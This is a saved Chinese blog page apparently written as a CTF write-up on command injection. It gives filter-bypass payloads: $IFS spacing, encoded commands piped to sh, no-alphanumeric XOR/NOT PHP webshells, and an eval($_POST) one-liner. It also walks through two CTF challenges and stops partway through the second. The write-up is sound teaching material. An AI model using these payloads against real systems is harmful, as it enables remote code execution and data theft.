@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<!-- saved from url=(0037)https://www.codenong.com/cs105422347/ -->
+<html lang="zh-CN" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta name="360-site-verification" content="e343ac8439d15b8393d3ced719a965ee">
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async="" src="./CTF下的命令执行 _ 码农家园_files/js"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-86041274-3');
+</script>
+<meta name="applicable-device" content="pc,mobile">
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+<title>CTF下的命令执行 | 码农家园</title>
+<meta name="description" content="前言：做web题也经常遇到很多关于命令执行的一些姿势，这次就总结下来。0x00:一些绕过姿势在遇到的一些web题中，会经常将以下几种给过滤或者进行限制：空格命...">
+<meta name="keywords" content="CTF下的命令执行">
+<link rel="shortcut icon" href="https://www.codenong.com/wp-content/themes/Nana/images/favicon.ico">
+<link rel="apple-touch-icon" sizes="114x114" href="https://www.codenong.com/wp-content/themes/Nana/images/favicon.png">
+<link rel="profile" href="https://gmpg.org/xfn/11">
+<link rel="pingback" href="https://www.codenong.com/xmlrpc.php">
+<!--[if lt IE 9]><script src="https://www.codenong.com/wp-content/themes/Nana/js/html5-css3.js"></script><![endif]-->
+<link rel="stylesheet" id="nfgc-main-style-css" href="./CTF下的命令执行 _ 码农家园_files/style.css" type="text/css" media="all">
+<script type="text/javascript" src="./CTF下的命令执行 _ 码农家园_files/jquery.min.js.下载"></script>
+<script type="text/javascript" src="./CTF下的命令执行 _ 码农家园_files/scrollmonitor.js.下载"></script>
+	<script>jQuery(document).ready(
+	function(jQuery){
+	jQuery('.collapseButton').click(function(){
+		jQuery(this).parent().parent().find('.xContent').slideToggle('slow');
+	});
+});</script>
+<script type="text/javascript" src="./CTF下的命令执行 _ 码农家园_files/gg.js.下载"></script>
+<!--[if IE]>
+<div class="tixing"><strong>温馨提示：感谢您访问本站，经检测您使用的浏览器为IE浏览器，为了获得更好的浏览体验，请使用极速模式或Chrome、Firefox等其他浏览器。</strong>
+</div>
+<![endif]-->
+<link rel="stylesheet" id="font-awesome-four-css" href="./CTF下的命令执行 _ 码农家园_files/font-awesome.min.css" type="text/css" media="all">
+<link rel="dns-prefetch" href="https://s.w.org/">
+<link rel="stylesheet" id="highlight-css" href="./CTF下的命令执行 _ 码农家园_files/highlight.css" type="text/css" media="all">
+<link rel="stylesheet" id="codecolorer-css" href="./CTF下的命令执行 _ 码农家园_files/codecolorer.css" type="text/css" media="screen">
+<script type="text/javascript">
+/* <![CDATA[ */
+var wpl_ajax_url = "https:\/\/www.codenong.com\/wp-admin\/admin-ajax.php";
+/* ]]> */
+</script>
+<script type="text/javascript" src="./CTF下的命令执行 _ 码农家园_files/script.js.下载"></script>
+<script type="text/javascript" src="./CTF下的命令执行 _ 码农家园_files/fancybox.js.下载"></script>
+<script type="text/javascript" src="./CTF下的命令执行 _ 码农家园_files/comments-ajax.js.下载"></script>
+<link rel="canonical" href="https://www.codenong.com/cs105422347/">
+<style type="text/css" id="syntaxhighlighteranchor"></style>
+
+<style type="text/css">.fancybox-margin{margin-right:0px;}</style><style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  z-index: 2147483647;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.immersive-translate-input-loading {
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+}
+
+@keyframes immersiveTranslateShadowRolling {
+  0% {
+    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  12% {
+    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  25% {
+    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  36% {
+    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  50% {
+    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
+  }
+
+  62% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
+  }
+
+  75% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
+  }
+
+  87% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
+  }
+
+  100% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
+  }
+}
+</style></head>
+<body class="post-template-default single single-post postid-1012700 single-format-standard" style="">
+<div id="page" class="hfeed site">
+	<header id="masthead" class="site-header" translate="no">
+	<nav id="top-header">
+		<div class="top-nav">
+			
+				</div>
+	</nav><!-- #top-header -->
+<div id="middle-header">
+
+</div>
+	<div id="menu-box" class="">
+		<div id="top-menu">
+			
+				<hgroup class="logo-site">
+				<h1 class="site-title">
+					<a href="https://www.codenong.com/">
+						码农家园
+					</a>
+				</h1>
+			</hgroup><!-- .logo-site -->			<div id="site-nav-wrap">
+				<div id="sidr-close"><a href="https://www.codenong.com/#sidr-close" class="toggle-sidr-close">关闭</a>
+			</div>
+			
+			<nav id="site-nav" class="main-nav">
+				<a href="https://www.codenong.com/cs105422347/#sidr-main" id="navigation-toggle" class="bars">导航</a>	
+								
+					
+								
+			</nav>	
+			</div><!-- #site-nav-wrap -->
+		</div><!-- #top-menu -->
+	</div><!-- #menu-box -->
+</header><!-- #masthead -->
+
+<div id="content" class="site-content">	
+	<div class="clear"></div>
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main" role="main">
+							<article id="post-1012700" class="post-1012700 post type-post status-publish format-standard hentry category-uncategorized">
+					<header class="entry-header">
+						<h1 class="entry-title">CTF下的命令执行</h1>
+						<div class="single_info">
+							
+							<br>
+<span class="archive-tag"></span>
+							<span class="views"></span>
+							
+								
+					
+					
+					
+							<span class="edit"></span>
+						</div>		
+					</header><!-- .entry-header -->
+
+					<div id="ad_sg" class="ad-pc">
+</div>										<div class="entry-content">
+						<div class="single-content">			
+							<h2>前言：</h2>
+<p></p><center> <script src="./CTF下的命令执行 _ 码农家园_files/c1.js.下载"></script></center><p></p>
+<p>做web题也经常遇到很多关于命令执行的一些姿势，这次就总结下来。</p>
+<h2>0x00:一些绕过姿势</h2>
+<p>在遇到的一些web题中，会经常将以下几种给过滤或者进行限制：</p>
+<ol>
+<li>空格</li>
+<li>命令分隔符</li>
+<li>关键字</li>
+<li>限制长度</li>
+<li>限制回显</li>
+</ol>
+<p>等等，这次就通过题目将这些如何绕过的知识给记录下来。</p>
+<h4>空格绕过</h4>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br></div></td><td><div class="text codecolorer">常见的绕过符号有：<br>
+$IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&lt;、<br>
+<br>
+#$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，<br>
+加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用</div></td></tr></tbody></table></div>
+<p>测试一下：<br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200410114203606.png" alt="在这里插入图片描述" class="box-hide box-show"></p>
+<h4>命令分隔</h4>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br>6<br>7<br></div></td><td><div class="text codecolorer">%0a &nbsp;--换行符，需要php环境<br>
+%0d &nbsp;--回车符，需要php环境<br>
+; &nbsp;--在 shell 中，是”连续指令”<br>
+&amp; &nbsp;--不管第一条命令成功与否，都会执行第二条命令<br>
+&amp;&amp; &nbsp;--第一条命令成功，第二条才会执行<br>
+| &nbsp;--第一条命令的结果，作为第二条命令的输入<br>
+|| &nbsp;--第一条命令失败，第二条才会执行</div></td></tr></tbody></table></div>
+<p></p><center> <script src="./CTF下的命令执行 _ 码农家园_files/c2.js.下载"></script><script async="" src="./CTF下的命令执行 _ 码农家园_files/f.txt" crossorigin="anonymous"></script>
+<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-1776224780566592" data-ad-slot="3590016480"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+</center><p></p>
+<p><img src="./CTF下的命令执行 _ 码农家园_files/20200410171042224.png" alt="在这里插入图片描述" class="box-hide box-show"><br>
+例如ctfhub这道题就过滤了命令分割符，用%0a便可以分隔命令进行查看</p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br></div></td><td><div class="text codecolorer">127.0.0.1%0als</div></td></tr></tbody></table></div>
+<p><img src="./CTF下的命令执行 _ 码农家园_files/2020041017150239.png" alt="在这里插入图片描述" class="box-hide"></p>
+<h4>关键词过滤</h4>
+<p>假如过滤了关键字cat\flag，无法读取不了flag.php，又该如何去做</p>
+<p><strong>拼接绕过</strong></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br>6<br></div></td><td><div class="text codecolorer">#执行ls命令：<br>
+a=l;b=s;$a$b<br>
+#cat flag文件内容：<br>
+a=c;b=at;c=f;d=lag;$a$b ${c}${d}<br>
+#cat test文件内容<br>
+a="ccaatt";b=${a:0:1}${a:2:1}${a:4:1};$b test</div></td></tr></tbody></table></div>
+<p></p><center> <script src="./CTF下的命令执行 _ 码农家园_files/c3.js.下载"></script><script async="" src="./CTF下的命令执行 _ 码农家园_files/f(1).txt"></script>
+<!-- auto -->
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-1776224780566592" data-ad-slot="9509745083" data-ad-format="auto" data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+</center><p></p>
+<p><strong>编码绕过</strong></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br></div></td><td><div class="text codecolorer">#base64<br>
+echo "Y2F0IC9mbGFn"|base64 -d|bash ==&gt;cat /flag<br>
+echo Y2F0IC9mbGFn|base64 -d|sh==&gt;cat /flag<br>
+#hex<br>
+echo "0x636174202f666c6167" | xxd -r -p|bash ==&gt;cat /flag<br>
+#oct/字节<br>
+$(printf "\154\163") ==&gt;ls<br>
+$(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") ==&gt;cat /flag<br>
+{printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|\$0 ==&gt;cat /flag<br>
+#i也可以通过这种方式写马<br>
+内容为&lt;?php @eval($_POST['c']);?&gt;<br>
+${printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} &gt;&gt; 1.php</div></td></tr></tbody></table></div>
+<p><strong>单引号和双引号绕过</strong></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br></div></td><td><div class="text codecolorer">c'a't test<br>
+c"a"t test</div></td></tr></tbody></table></div>
+<p><strong>反斜杠绕过</strong></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br></div></td><td><div class="text codecolorer">ca\t test</div></td></tr></tbody></table></div>
+<p><strong>通过$PATH绕过</strong></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br>6<br></div></td><td><div class="text codecolorer">#echo $PATH 显示当前PATH环境变量，该变量的值由一系列以冒号分隔的目录名组成<br>
+#当执行程序时，shell自动跟据PATH变量的值去搜索该程序<br>
+#shell在搜索时先搜索PATH环境变量中的第一个目录，没找到再接着搜索，如果找到则执行它，不会再继续搜索<br>
+echo $PATH <br>
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>
+`echo $PATH| cut -c 8,9`t test</div></td></tr></tbody></table></div>
+<p></p><center> <script src="./CTF下的命令执行 _ 码农家园_files/c4.js.下载"></script></center><p></p>
+<p><img src="./CTF下的命令执行 _ 码农家园_files/20200411175351768.png" alt="在这里插入图片描述" class="box-hide"><br>
+<strong>通配符绕过</strong></p>
+<ol>
+<li>[…]表示匹配方括号之中的任意一个字符</li>
+<li>{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</li>
+<li>{…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开<br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200411175911325.png" alt="在这里插入图片描述"></li>
+</ol>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br></div></td><td><div class="text codecolorer">cat t?st<br>
+cat te*<br>
+cat t[a-z]st<br>
+cat t{a,b,c,d,e,f}st</div></td></tr></tbody></table></div>
+<p><img src="./CTF下的命令执行 _ 码农家园_files/20200411180147744.png" alt="在这里插入图片描述" class="box-hide"></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br></div></td><td><div class="text codecolorer">#linux中查看文件内容的命令<br>
+cat、tac、more、less、head、tail、nl、sed、sort、uniq</div></td></tr></tbody></table></div>
+<h4><strong>内联执行</strong></h4>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br></div></td><td><div class="text codecolorer">内联执行将反引号内命令的输出作为输入执行，类似的还有$(command)</div></td></tr></tbody></table></div>
+<h4>无字母数字构造Webshell</h4>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br></div></td><td><div class="text codecolorer">&lt;?php<br>
+error_reporting(0);<br>
+if(isset($_GET['code'])){<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $code=$_GET['code'];<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(strlen($code)&gt;40){<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; die("This is too Long.");<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(preg_match("/[A-Za-z0-9]+/",$code)){<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; die("NO.");<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; @eval($code);<br>
+}<br>
+else{<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; highlight_file(__FILE__);<br>
+}<br>
+// ?&gt;</div></td></tr></tbody></table></div>
+<p>类似这种，过滤了字符和数字，可以通过以下几种方法进行绕过</p>
+<p><strong>方法一:异或</strong></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br>6<br></div></td><td><div class="text codecolorer">var_dump('#'^'|'); //得到字符 _ <br>
+var_dump('.'^'~'); //得到字符 P &nbsp; &nbsp; <br>
+var_dump('/'^'`'); //得到字符 0 &nbsp; &nbsp; <br>
+var_dump('|'^'/'); //得到字符 S &nbsp; &nbsp; <br>
+var_dump('{'^'/'); //得到字符 T &nbsp; &nbsp; <br>
+$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/"); &nbsp;//变量$__值为字符串'_POST'</div></td></tr></tbody></table></div>
+<p>可以简单编写一个脚本来查看谁和谁异或得到的结果是我们想要的</p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br>6<br></div></td><td><div class="text codecolorer">if __name__ == "__main__":<br>
+&nbsp; &nbsp; for i in range(0,127):<br>
+&nbsp; &nbsp; &nbsp; &nbsp; for j in range(0,127):<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; result=i^j<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(chr(result) is '想要的字符'):<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(' '+chr(i)+' xor '+chr(j)+' == '+chr(result))</div></td></tr></tbody></table></div>
+<p><img src="./CTF下的命令执行 _ 码农家园_files/20200413225927262.png" alt="在这里插入图片描述" class="box-hide"><img src="./CTF下的命令执行 _ 码农家园_files/20200413225845386.png" alt="在这里插入图片描述" class="box-hide"><br>
+<strong>websell</strong></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br></div></td><td><div class="text codecolorer">$_="`{{{"^"?&lt;&gt;/";${$_}[_](${$_}[__]);&amp;_=assert&amp;__=phpinfo() <br>
+或<br>
+${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&amp;_=assert&amp;__=phpinfo()</div></td></tr></tbody></table></div>
+<p><strong>如果过滤了&amp;_等字符</strong></p>
+<p><strong>方法二：取反</strong></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br>6<br></div></td><td><div class="text codecolorer">&lt;?php<br>
+$a = "phpinfo";<br>
+echo urlencode(~$a);<br>
+?&gt;<br>
+#%8F%97%8F%96%91%99%90<br>
+(~%8F%97%8F%96%91%99%90)();</div></td></tr></tbody></table></div>
+<p><img src="./CTF下的命令执行 _ 码农家园_files/20200413230512267.png" alt="在这里插入图片描述" class="box-hide"><br>
+当然还有其他方法，可以看p神师傅写的<br>
+https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</p>
+<h2>0x01:CTF考察命令执行的题</h2>
+<h4>[GXYCTF2019]Ping Ping Ping</h4>
+<p><strong>——base编码、颠倒顺序、内联执行</strong><br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200411232943206.png" alt="在这里插入图片描述" class="box-hide"><br>
+有两个文件，先查看一下index.php</p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br></div></td><td><div class="text codecolorer">?ip=1;cat index.php</div></td></tr></tbody></table></div>
+<p>出现fxck your space!，所以空格被过滤掉了，测试发现<wyn>$IFS$9</wyn>可以绕过去<br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200411233157403.png" alt="在这里插入图片描述" class="box-hide"><br>
+过滤了很多，而且结合<wyn>preg_match("/.*f.*l.*a.*g.*/", $ip)</wyn>基本是不可能使用<wyn>cat fl*.php</wyn>这种正则绕过来查看了。</p>
+<p><strong>解法一：</strong><br>
+虽然过滤了bash，但没过滤sh,可以使用下面的方法：</p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br></div></td><td><div class="text codecolorer">echo Y2F0IC9mbGFn|base64 -d|sh==&gt;cat /flag</div></td></tr></tbody></table></div>
+<p><strong>payload：</strong></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br></div></td><td><div class="text codecolorer">1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh<br>
+#sh是linux中运行shell的命令，bash相当于sh的升级版，sh∈bash<br>
+#Y2F0IGZsYWcucGhw<br>
+#cat flag.php</div></td></tr></tbody></table></div>
+<p><img src="./CTF下的命令执行 _ 码农家园_files/20200411234003538.png" alt="在这里插入图片描述" class="box-hide"><br>
+<strong>解法二：</strong><br>
+既然flag.php无法直接绕过去，就使用拼接的方法</p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br></div></td><td><div class="text codecolorer">if(preg_match("/.*f.*l.*a.*g.*/", $ip)){<br>
+&nbsp; &nbsp; die("fxck your flag!");<br>
+匹配一个字符串中，是否按顺序出现过flag四个字母</div></td></tr></tbody></table></div>
+<p>如果是按照往常的顺序去拼接，是绕不过去的</p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br></div></td><td><div class="text codecolorer">?ip=127.0.0.1;a=fl;b=ag;cat$IFS$9$a$b.php</div></td></tr></tbody></table></div>
+<p>所以可以颠倒一下顺序</p>
+<p></p><center> <script src="./CTF下的命令执行 _ 码农家园_files/c5.js.下载"></script></center><p></p>
+<p><strong>payload</strong>：</p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br></div></td><td><div class="text codecolorer">?ip=1;a=ag;b=fl;cat$IFS$1$b$a.php<br>
+#也可以<br>
+?ip=1;a=lag;cat$IFS$9f$a.php</div></td></tr></tbody></table></div>
+<p><strong>解法三：</strong></p>
+<p>内联执行将反引号内命令的输出作为输入执行。</p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br></div></td><td><div class="text codecolorer">?ip=1;cat$IFS$9`ls`</div></td></tr></tbody></table></div>
+<p>直接爆出来两个文件的内容<br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200411235654592.png" alt="在这里插入图片描述" class="box-hide"></p>
+<h4>[极客大挑战 2019]RCE ME</h4>
+<p><strong>——无字母数字构造webshell、绕过disable_functions</strong><br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200412143330218.png" alt="在这里插入图片描述" class="box-hide"><br>
+这串代码过滤了全部的字母和数字，之前的绕过方法都不起作用了，就只能编写一个不使用数字和字母的webshell。</p>
+<p>在构造前，要先了解一下php5\php7的特性<br>
+<img src="./CTF下的命令执行 _ 码农家园_files/2020041223130599.png" alt="在这里插入图片描述" class="box-hide"></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br></div></td><td><div class="text codecolorer">1.phpinfo() #php5、php7可执行<br>
+2.(phpinfo)() #php7可执行<br>
+3.php5中，assert是一个函数，可以通过$f='assert';$f(...);这样的方法来动态执行任意代码。<br>
+4.php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码。<br>
+5.在php7的环境中，可以使用编码转换等形式，将phpinfo转换成一些不可见字符再传入</div></td></tr></tbody></table></div>
+<p>使用URL编码的原因是，在进行“~”(取反)运算时，经常会生成不可见字符。</p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br></div></td><td><div class="text codecolorer">&lt;?php<br>
+$a = "phpinfo";<br>
+echo urlencode(~$a);<br>
+?&gt;<br>
+%8F%97%8F%96%91%99%90</div></td></tr></tbody></table></div>
+<p>查看一下</p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br></div></td><td><div class="text codecolorer">?code=(~%8F%97%8F%96%91%99%90)();<br>
+#发现是可以执行的，所以是php7</div></td></tr></tbody></table></div>
+<p><img src="./CTF下的命令执行 _ 码农家园_files/20200412233439809.png" alt="在这里插入图片描述" class="box-hide"><br>
+这里之所以正则没有检测到，是因为后端自动进行了解码，解码为非字母和数字字符，然后eval再执行了取反还原为phpinfo，所以可以绕过去<br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200412234032838.png" alt="在这里插入图片描述" class="box-hide"><br>
+过滤了很多常用的执行系统命令的函数，先尝试读取系统目录,可以使用scandir函数</p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br></div></td><td><div class="text codecolorer">print_r(scandir('./'));<br>
+print_r<br>
+#%8F%8D%96%91%8B%A0%8D<br>
+(~%8F%8D%96%91%8B%A0%8D)();<br>
+scandir<br>
+#%8C%9C%9E%91%9B%96%8D<br>
+(~%8C%9C%9E%91%9B%96%8D)(('./'));<br>
+#payload:<br>
+(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)(("./")));</div></td></tr></tbody></table></div>
+<p><img src="./CTF下的命令执行 _ 码农家园_files/20200412234932439.png" alt="在这里插入图片描述" class="box-hide"><br>
+读取一下根目录发现<br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200412235042949.png" alt="在这里插入图片描述" class="box-hide"></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br></div></td><td><div class="text codecolorer">利用readfile来进行读取文件<br>
+readfile('/flag')<br>
+readfile<br>
+#%8D%9A%9E%9B%99%96%93%9A<br>
+(~%8D%9A%9E%9B%99%96%93%9A)();<br>
+/flag<br>
+#%D0%99%93%9E%98<br>
+#payload:<br>
+(~%8D%9A%9E%9B%99%96%93%9A)((~%D0%99%93%9E%98));<br>
+#读取flag无回显<br>
+(~%8D%9A%9E%9B%99%96%93%9A)((~%D0%8D%9A%9E%9B%99%93%9E%98));<br>
+#读取readflag有回显</div></td></tr></tbody></table></div>
+<p><img src="./CTF下的命令执行 _ 码农家园_files/20200412235727555.png" alt="在这里插入图片描述" class="box-hide"><br>
+那接下来只能传马连接了，fuzz一下发现eval\assert函数都没有被ban</p>
